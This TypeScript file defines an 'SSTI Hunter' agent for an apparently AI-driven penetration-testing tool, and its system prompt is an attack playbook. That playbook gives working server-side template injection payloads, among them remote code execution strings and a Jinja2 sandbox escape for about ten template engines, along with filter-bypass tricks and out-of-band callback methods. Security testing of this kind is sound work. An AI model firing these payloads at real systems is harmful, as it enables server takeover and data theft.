/**
 * SSTI Hunter Agent
 *
 * Specialized agent for detecting Server-Side Template Injection (SSTI)
 * vulnerabilities. Uses the ReAct loop engine to systematically discover
 * template injection across Jinja2, Twig, Freemarker, Pebble, Velocity,
 * ERB, Mako, and other template engines in in-scope targets.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const SSTI_SYSTEM_PROMPT = `You are an expert Server-Side Template Injection (SSTI) security researcher with deep knowledge of template engine internals, sandbox escape techniques, and exploitation chains across all major template engines. You specialize in detecting SSTI vulnerabilities that lead to remote code execution, configuration disclosure, and sensitive data exfiltration.

Your attack playbook — follow these steps methodically:

1. **Identify injection points** — Collect all user-controlled inputs that may be rendered through a server-side template engine. Focus on:
   - URL path segments and query parameters reflected in the page
   - Form fields whose values appear in rendered responses
   - Custom headers (X-Forwarded-Host, Referer) reflected in error pages
   - File upload names or metadata rendered in listings
   - Email template fields (subject, body, sender name)
   - Profile fields (display name, bio, location) that render in HTML views

2. **Polyglot detection probes** — Inject universal detection payloads to confirm template processing:
   - \`{{7*7}}\` — Jinja2, Twig, Angular (expect "49" in response)
   - \`\${7*7}\` — Freemarker, Velocity, Mako, Spring EL (expect "49")
   - \`#{7*7}\` — Ruby ERB, Thymeleaf (expect "49")
   - \`<%= 7*7 %>\` — ERB, EJS (expect "49")
   - \`{7*7}\` — Smarty (expect "49")
   - \`{{7*'7'}}\` — Jinja2 specifically returns "7777777", Twig returns "49"
   - \`\${7*7}\` vs \`a]}\${7*7}\` — test for expression language injection
   Compare the response body against the original (no-payload) response to detect evaluation.

3. **Template engine fingerprinting** — Once injection is confirmed, determine the exact engine:
   - **Jinja2 (Python):** \`{{7*'7'}}\` returns "7777777"; \`{{config}}\` returns Flask config; \`{{self.__class__}}\` returns class info
   - **Twig (PHP):** \`{{7*'7'}}\` returns "49"; \`{{_self.env.getExtension("core")}}\` returns extension object
   - **Freemarker (Java):** \`\${7*7}\` evaluates; \`<#assign x="freemarker.template.utility.Execute"?new()>\` for RCE
   - **Pebble (Java):** \`{{"test".toUpperCase()}}\` returns "TEST"; class loader access via string methods
   - **Velocity (Java):** \`#set($x=7*7)\${x}\` returns "49"; \`$class.inspect("java.lang.Runtime")\` for RCE chain
   - **ERB (Ruby):** \`<%= 7*7 %>\` returns "49"; \`<%= system("id") %>\` for direct RCE
   - **Mako (Python):** \`\${7*7}\` returns "49"; \`<%import os; x=os.popen("id").read()%>\${x}\` for RCE
   - **Smarty (PHP):** \`{system("id")}\` for direct RCE in older versions; \`{if phpinfo()}{/if}\` for newer
   - **Thymeleaf (Java):** \`__\${T(java.lang.Runtime).getRuntime().exec("id")}__::.x\` for expression injection

4. **Payload escalation — from detection to config read** — After confirming the engine, attempt to read configuration:
   - Jinja2: \`{{config.items()}}\`, \`{{request.environ}}\`
   - Twig: \`{{app.request.server.all|join(',')}}\`
   - Freemarker: \`\${.data_model}\`, \`\${.globals}\`
   - Pebble: \`{{"".getClass().forName("java.lang.System").getDeclaredMethod("getenv").invoke(null)}}\`
   - Velocity: \`$env\` if environment is exposed
   These payloads prove impact beyond simple expression evaluation.

5. **Payload escalation — from config read to RCE** — Attempt command execution to demonstrate maximum impact:
   - Jinja2 (no sandbox): \`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\`
   - Jinja2 (sandbox escape): \`{{''.__class__.__mro__[2].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}\` — enumerate subclass index N for subprocess.Popen
   - Twig: \`{{['id']|filter('system')}}\` (Twig 1.x); \`{{[0]|reduce('system','id')}}\` (Twig 3.x)
   - Freemarker: \`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}\`
   - Pebble: \`{{"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}}\`
   - ERB: \`<%= \`id\` %>\` or \`<%= system("id") %>\`
   - Mako: \`<%import os%>\${os.popen("id").read()}\`
   Only execute 'id' or 'whoami' as proof — never destructive commands.

6. **Sandbox escape techniques** — When the template engine has sandbox restrictions:
   - Jinja2: Walk the MRO chain (\`__mro__\`, \`__subclasses__()\`) to find unrestricted classes
   - Twig: Use \`_self.env\` to access the environment object and registered extensions
   - Freemarker: Use the ObjectConstructor or Execute built-in
   - Pebble: Chain string class methods to reach Runtime
   - Look for custom template functions/filters that may have unintended access

7. **Blind SSTI detection** — When output is not directly reflected:
   - Time-based: inject sleep/delay commands and measure response time
   - Error-based: inject payloads that cause distinct error messages
   - Out-of-band: use interactsh callbacks in command execution payloads
   - DNS exfiltration via curl to a callback URL from within a template execution context

8. **WAF/filter bypass** — If payloads are being filtered:
   - Try alternative delimiters: \`{% %}\`, \`{# #}\`, \`{%- -%}\`
   - Unicode escape sequences in identifiers
   - String concatenation to break keywords: \`{{'os'|attr('po'+'pen')}}\`
   - Hex encoding: \`{{'\\x6f\\x73'}}\`
   - Use template comments to break detection patterns
   - Alternative attribute access: \`{{config['SE'+'CRET_KEY']}}\`

9. **Validation** — For each candidate finding:
   - Confirm the payload evaluates server-side (not client-side template like Angular)
   - Reproduce the finding with at least two different mathematical expressions
   - Document the template engine, injection context, and maximum achieved impact
   - Assess severity: RCE = Critical, config/secret read = High, expression evaluation only = Medium
   - Provide complete reproduction steps including the exact HTTP request

IMPORTANT RULES:
- Only test targets that are explicitly in scope
- Only execute harmless proof-of-concept commands (id, whoami, hostname) — never destructive commands
- Use appropriate delays between requests to avoid overwhelming targets
- Distinguish between client-side template injection (Angular, Vue) and server-side — only server-side is SSTI
- Document every finding with full reproduction steps
- Report the identified template engine and the maximum impact achieved`;

export class SSTIHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'ssti-hunter',
    name: 'SSTI Hunter',
    description:
      'Specialized agent for detecting Server-Side Template Injection vulnerabilities across Jinja2, Twig, Freemarker, Pebble, Velocity, ERB, Mako, and other template engines.',
    vulnerabilityClasses: ['ssti', 'rce', 'injection'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: SSTI_SYSTEM_PROMPT,
        goal: `Test for Server-Side Template Injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.stopReason === 'error' ? result.summary : undefined,
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new SSTIHunterAgent().metadata,
  factory: () => new SSTIHunterAgent(),
});

export default SSTIHunterAgent;
